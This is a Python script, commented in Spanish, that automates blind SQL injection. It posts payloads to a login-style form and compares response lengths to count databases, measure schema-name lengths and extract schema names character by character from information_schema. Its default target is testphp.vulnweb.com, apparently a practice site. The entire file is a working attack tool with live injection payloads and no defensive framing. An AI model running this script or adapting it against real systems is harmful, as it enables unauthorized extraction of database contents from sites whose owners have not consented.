import requests
import curses


def sacarNumTablas(url):
    #print("sacar num bases de datos")
    payload = "'+or+(select+count(schema_name)+from+information_schema.schemata)%3d@+--+-+"
    

    numero_parametros = int(input("Introduce el numero de parametros: "))
    parametros = {}
    datosNecesarios = []
    for i in range(numero_parametros):
        nombre = input("Introduce el nombre del parametro {}: ".format(i + 1))
        datosNecesarios.append(nombre)
        parametros[nombre] = payload


    consulta = "&".join("{}={}".format(k, v) for k, v in parametros.items())

    header = {
    "Content-Type": "application/x-www-form-urlencoded"
    }

    try:
        respuesta = requests.post(url, data=consulta, headers=header)
        respuesta.raise_for_status()
        LongitudDeError=len(respuesta.content)
        print(LongitudDeError)
    except requests.exceptions.HTTPError:
        print(f"Error al obtener la pagina web: {url}")
    
    #print(urlTrucado)
    numeroABuscar=int(input("Introduzca el numero de busquedas de bases de datos: "))
    
    for i in range (numeroABuscar):
        num = str(i)
        buscado = consulta.replace("@", num)
        print(url)
        print(buscado)
        try:

            respuesta = requests.post(url, data=buscado, headers=header)
            respuesta.raise_for_status()
            Longitud=len(respuesta.content)
            print(Longitud)
            if(LongitudDeError != Longitud):
               print(f"El numero de la base de datos es: {i}")
               print("------------------------------------------------------")
               return i, datosNecesarios
        except requests.exceptions.HTTPError:
            print(f"Error al obtener la pagina web: {url}")

    return 0


#######################################################################################

def SacarLargoNombre(numBase, url, numeroABuscarLargoNombre, datazos):
    print(datazos[0])
    print(datazos[1])
    payload = "'+or+(select+length(schema_name)+from+information_schema.schemata+limit+^,1)=@+--+-+"
    payloadPersonalizado = payload.replace("^", str(numBase))

    header = {
    "Content-Type": "application/x-www-form-urlencoded"
    }
    consultaParaError = {
        datazos[0]: "///",
        datazos[1]: "///"
    }

    consulta = "&".join("{}={}".format(k, v) for k, v in consultaParaError.items())
    
    try:
        respuesta = requests.post(url, data=consulta, headers=header)
        respuesta.raise_for_status()
        LongitudDeError=len(respuesta.content)
        print(LongitudDeError)
    except requests.exceptions.HTTPError:
        print(f"Error al obtener la pagina web: {url}")
    
    
    #print(urlTrucado)
    #numeroABuscarLargoNombre=int(input("Introduzca el numero de largo del nombre: "))
    for i in range (numeroABuscarLargoNombre):
        num = str(i)
        parametroBuscado = payloadPersonalizado.replace("@", num)
        #print(urlBuscado)
        try:

            consultaParaEncontrar = {
                datazos[0]: parametroBuscado,
                datazos[1]: parametroBuscado
            }

            consulta = "&".join("{}={}".format(k, v) for k, v in consultaParaEncontrar.items())
            print(consulta)
            respuesta = requests.post(url, data=consulta, headers=header)
            respuesta.raise_for_status()
            Longitud=len(respuesta.content)
            print(Longitud)
            if(Longitud != LongitudDeError):
               print(f"El nombre de la tabla contiene este numero de letras: {i}")
               print("------------------------------------------------------")
               return i
        except requests.exceptions.HTTPError:
            print(f"Error al obtener la pagina web: {url}")
    return 1



######################################################################################

def sacarNombre(longitudNombreTabla, url, numTabla, datazos):
    #print("Sacar nombre")

    header = {
    "Content-Type": "application/x-www-form-urlencoded"
    }
    consultaParaError = {
        datazos[0]: "///",
        datazos[1]: "///"
    }

    consulta = "&".join("{}={}".format(k, v) for k, v in consultaParaError.items())
    try:
        respuesta = requests.post(url, data=consulta, headers=header)
        respuesta.raise_for_status()
        LongitudDeError=len(respuesta.content)
        print(LongitudDeError)
    except requests.exceptions.HTTPError:
        print(f"Error al obtener la pagina web: {url}")

    payload = "'+or+substring((select+schema_name+from+information_schema.schemata+limit+^,1),@,1)='/'+--+-+"
    payloadPers = payload.replace("^" ,str(numTabla))
    nombreTabla = ""
    for i in range (longitudNombreTabla):
        payloadPersNum= payloadPers.replace("@", str(i+1))
        for j in range (95, 128):
            print(j)
            payloadPersNumLetra = payloadPersNum.replace("/", chr(j))
            

            consultaParaEncontrar = {
                datazos[0]: payloadPersNumLetra,
                datazos[1]: payloadPersNumLetra
            }
            consulta = "&".join("{}={}".format(k, v) for k, v in consultaParaEncontrar.items())
            print(consulta)


            #print(urlBuscado)
            try:
                respuesta = requests.post(url, data=consulta, headers=header)
                respuesta.raise_for_status()
                Longitud=len(respuesta.content)
                print(Longitud)
                if(Longitud != LongitudDeError):
                    nombreTabla+=chr(j)
                    print(nombreTabla)
            except requests.exceptions.HTTPError:
                print(f"Error al obtener la pagina web: {url}")

    print(f"El nombre de la tabla es: {nombreTabla}")
    print("------------------------------------------------------")
#####################################################################################

url="http://testphp.vulnweb.com/userinfo.php"
#url=(input("Introduzca la URL, con un asterisco en el parametro vulnerable: "))

numeroBaseDeDatos, datazos=sacarNumTablas(url)
if(numeroBaseDeDatos !=0):
    for i in range(numeroBaseDeDatos):
        numeroABuscarLargoNombre=1
        longitudNombreTabla=1
        while(longitudNombreTabla == 1 ):
            numeroABuscarLargoNombre+=1
            #numeroABuscarLargoNombre=int(input("Introduzca el numero de largo del nombre: "))
            longitudNombreTabla = SacarLargoNombre(i, url, numeroABuscarLargoNombre, datazos)
        sacarNombre(longitudNombreTabla, url, i, datazos)
else:
    print("No se pudo sacar el numero de bases de datos, revisa el URL proporcionado")

#http://testphp.vulnweb.com/userinfo.php
#test%2Ftest